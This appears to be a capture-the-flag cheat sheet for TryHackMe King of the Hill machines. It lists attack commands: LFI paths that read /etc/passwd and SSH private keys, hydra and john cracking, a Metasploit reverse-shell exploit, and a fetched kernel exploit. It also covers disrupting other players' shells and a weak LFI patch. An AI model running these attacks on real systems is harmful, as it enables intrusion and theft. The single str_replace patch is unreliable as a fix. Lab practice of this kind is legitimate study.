
# King of The Hill

Attacking
- Ready
    - ssh-keygen -f "/home/$USER/.ssh/known_hosts" -R "target.ip"
    - mkdir ~/THM/<Room>
    - cd ~/THM/<Room>touch
    - ~/THM/<Room>/clue.txt
- Recon
- Port
    - sudo set.target.ip <x.x.x.x>
    - nmap.target.ip
        - 22
        - 80
        - 110
        - 143
        - 139/445
        - 1337
        - 3306
        - 5555
        - 8080
        - 9999
        - 24964
- Scan
    - 22/tcp  open  ssh        syn-ack ttl 61 OpenSSH 7.2p2 Ubuntu 4ubuntu2.2 (Ubuntu Linux; protocol 2.0)
    - 80/tcp    open  http       syn-ack ttl 61 Apache httpd 2.4.18 ((Ubuntu))
        - /robots.txt
        - /sitemap.xml
        - view-source
        - gobuster
            - /upload
            - Insecure File Upload Perl shell
        - nikto -h target.ip
        - wpscan
        - hydra
        - Burp Suite
    - 1337/tcp  open  ssh        syn-ack ttl 61 OpenSSH 7.2p2 Ubuntu 4ubuntu2.2 (Ubuntu Linux; protocol 2.0)
    - 3306/tcp  open  mysql      syn-ack ttl 61 MySQL 5.7.19-0ubuntu0.16.04.1
        - hydra -l root -P /usr/share/wordlists/rockyou.txt target.ip mysql
    - 5555/tcp  open  http       syn-ack ttl 61 nginx 1.10.3 (Ubuntu)
        - The page variable is the one defining on which page we are /?page=posts.php
            - http://MACHINE_IP:5555/?page=../../../etc/passwd
        - Since this is “Gloria’s blog”, we can expect there is a user named gloria in the machine 
            - http://MACHINE_IP:5555/?page=../../../home/gloria/.ssh/id_rsa
            - save it to id_rsa
            - chmod 400 id_rsa
    - 8080/tcp  open  http       syn-ack ttl 61 nostromo 1.9.6
        - This version is outdated and has a Remote Code Execution vulnerability. 
            - searchsploit (searchsploit nostromo 1.9.6)
    - 9999/tcp  open  abyss?     syn-ack ttl 61
    - 24964/tcp open  tcpwrapped syn-ack ttl 61
- Shell
    - ssh
        - ssh2john id_rsa > john
        - extract passphrase
            - john -w=/usr/share/wordlists/rockyou.txt john
        - ssh -i id_rsa -t gloria@MACHINE_IP -p 1337
    - msfconsole
        - use exploit/multi/http/nostromo_code_exec
        - set rport 8080
        - set rhost target.ip
        - check
        - set payload linux/x86/meterpreter/reverse_tcp
        - set lhost tun0
        - run
    - reverse shell
        - Upload "Perl shell" /upload
        - Stablish by using Python’s Pty module
            - python3 -c 'import pty;pty.spawn("/bin/bash");'
            - export TERM=xterm
- Root   
    - Privilege Escalation
        - looking for root permissions
            - find / -type f \( -perm -4000 -o -perm -2000 \) -print 2>/dev/null
        - linpeas.sh
            - /usr/bin/tmux -S /.dev/session
        - kernel exploit (CVE-2017-16995)
            - wget https://raw.githubusercontent.com/gugronnier/CVE-2017-16995/master/exploit-poc-pentest.c
            - gcc --static exploit-poc-pentest.c -o exploit-poc-pentest
            - Send it to the machine
            - chmod +x ./exploit-poc-pentest
            - ./exploit-poc-pentest
    - Become King
        - whoami
        - echo "USERNAME" > /root/king.txt
            - permission denied
                - chattr -ia /root/king.txt
            - chattr removed
                - https://busybox.net/downloads/binaries/1.31.0-i686-uclibc/
    - Flags
        - /home/gloria/user.txt 	 
        - /home/marty/user.txt 	Reversed
        - /home/alex/user.txt 	Rot13
        - /root/.flag 	 
        - /opt/code/server.py 	 
        - MySQL: db-> blog, table-> users, id-> 140
Defending
- King
    - chattr +ia /root/king.txt
    - Remove chattr
        - which chattr # Get chattr's path, default: /usr/bin/chattr
        - rm usr/bin/chattr # Or another path if different
    - clobber
        - set -o noclobber
        - add this to bashrc of root and source it
- Patching
    - Nostromo RCE Patch, port 8080
        - update it
        - putting Nostromo down and running a Python http.server
            - /var/nostromo/htdocs
            - ps aux | grep nhttpd
            - kill -9 <PID>
            - cd /var/nostromo/htdocs
            - python3 -m http.server -b target.ip 8080
    - LFI Patch, port 5555 
        - removing every ../ from the page variable
            - <?php include($_GET["page"]); ?> To <?php include(str_replace("../","",$_GET["page"])); ?>
    - Insecure File Upload Patch
        - quickest patch we can issue is to remove or comment line. exec("/usr/bin/perl " . $target_file);
    - OS
        - sudo
            - fixing the vulnerability in /etc/sudoers
                - remove everything from /etc/sudoers except root ALL=(ALL=ALL) ALL
        - changing ssh keys, changing passwords, look for the processes running or give cronjobs a look
        - Make copies of SUID binaries, even though they are easy to find, but can sometimes save get you a root shell from www-data.
        - SSH AuthKey
            - put your ssh keys on to the user/root authorized_keys
            - rename the public key to : authorized_keys     
- Backdoors
- Aggressive Defense
    - Get your pts number
        - /dev/pts/x
        - w
        - who
        - tty
        - echo $$
        - ps aux | grep pts
    - Find every other pts
        - ps aux | grep pts
    - Kick other players’ shells
        - kill -9 <PID>
        - pkill -9 -t pts/<OTHER_PTS_ID>
    - Breaking other players’ pts
        - echo "Hello 1337" > /dev/pts/<OTHER_PTS_ID>
        - cat /dev/urandom > /dev/pts/<OTHER_PTS_ID>
        - nyancat > /dev/pts/<OTHER_PTS_ID>
            - git clone https://github.com/klange/nyancat
            - cd nyancat/src
            - make
            - Sending Nyancat to machine
        - tetris
    - Break into the shell of other logged in users
        - script -f /dev/pts/<OTHER_PTS_ID>


https://blog.noxtal.com/writeups/2020/07/11/tryhackme-koth-lion/
https://blog.noxtal.com/cheatsheets/2020/08/08/ultimate-koth-defense-guide/
https://github.com/calebstewart/pwncat
https://gtfobins.github.io/
